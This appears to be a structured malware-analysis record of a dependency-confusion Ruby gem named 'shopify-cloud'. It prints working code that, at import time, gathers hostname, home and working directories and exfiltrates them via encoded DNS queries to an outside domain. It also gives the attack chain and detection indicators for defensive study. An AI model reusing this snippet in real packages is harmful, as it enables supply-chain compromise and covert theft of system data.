package_info.why_malicious: The package is a counterfeit component published to public repositories with the same name as internal/private dependencies used by target organizations. When installed, it executes code that exfiltrates system information (username, working directory, IP address) to an external server controlled by the attacker, demonstrating a supply chain attack via dependency confusion.

execution_context.file_location: main Ruby file of the counterfeit gem (e.g., shopify-cloud.rb)

malicious_snippets.code_snippet:
require 'socket'
require 'json'
require 'resolv'

suffix = '.dns.alexbirsan-hacks-paypal.com'
ns = 'dns1.alexbirsan-hacks-paypal.com'

package = 'shopify-cloud'

data = {
  'p' => package,
  'u' => Socket.gethostname,
  'c' => File.expand_path('~'),
  'd' => Dir.pwd
}

data = JSON.generate(data)
data = data.unpack('h*')[0].scan(/.{1,60}/)

id_1 = rand(36**12).to_s(36)
id_2 = rand(36**12).to_s(36)

begin
  ns_ip = Resolv.getaddress(ns)
rescue
  ns_ip = '4.4.4.4'
end

custom_res = Resolv::DNS.new({:nameserver => [ns_ip, '8.8.8.8']})

data.each_with_index do |chunk, idx|
  begin
    Resolv.getaddress("v2_f_#{id_1}_#{idx.to_s}_#{chunk}#{suffix}")
  rescue; end
  begin
    custom_res.getaddress("v2_f_#{id_2}_#{idx.to_s}_#{chunk}#{suffix}")
  rescue; end
end
malicious_snippets.code_behavior: At import-time, the code collects the hostname, home directory, and current working directory, serializes this data, and exfiltrates it via DNS queries to a domain controlled by the attacker, enabling system fingerprinting and external notification of successful compromise.

malice_analysis.why_suspicious: The code collects sensitive system information and exfiltrates it to an external server using DNS queries, which is a common technique to bypass network monitoring and firewalls.
malice_analysis.violated_expectations: Legitimate packages should not collect or transmit environment details to external servers, especially not at import-time or without user consent.
malice_analysis.similar_legitimate_use: Some telemetry or crash reporting tools may collect environment data, but they do so transparently, with user consent, and over standard protocols (HTTPS), not DNS.
key_indicators: Exfiltration of system information (hostname, directory, etc.)
Use of DNS queries for data exfiltration

attack_chain.action: Attacker publishes counterfeit package with the same name as a private/internal dependency to a public repository, using a very high version number.
attack_chain.leads_to: Automated build systems or developers pull the malicious package instead of the intended internal one.

attack_chain.action: Malicious package is automatically installed or imported during the build or runtime process.
attack_chain.leads_to: Malicious code within the package is executed.

attack_chain.action: Malicious code collects system information (hostname, home directory, working directory) and exfiltrates it via DNS queries to an attacker-controlled domain.
attack_chain.leads_to: Attacker is notified of successful compromise and can identify the victim organization.

behavioral_signatures: Automatic execution of code at import-time or install-time in third-party packages
Collection and serialization of system/environment information
Outbound DNS queries with encoded data to suspicious or attacker-controlled domains
file_indicators: Presence of code that uses Socket, File, Dir, and Resolv libraries together in package entrypoints
References to attacker-controlled domains (e.g., *.alexbirsan-hacks-paypal.com) in source code
Unusual version numbers (e.g., 9999.x.x) in public packages matching internal dependency names
network_indicators: Unusual DNS traffic patterns with long/encoded subdomains
Unexpected external DNS lookups during build or install processes
detection_knowledge.how_to_detect: Monitor for packages that execute code at import or install time, especially those that access system information and perform outbound DNS queries to non-standard or suspicious domains. Flag packages with names matching internal dependencies but with unusually high version numbers in public repositories. Use static analysis to detect hardcoded external domains and dynamic analysis to observe unexpected network activity during package installation or import.
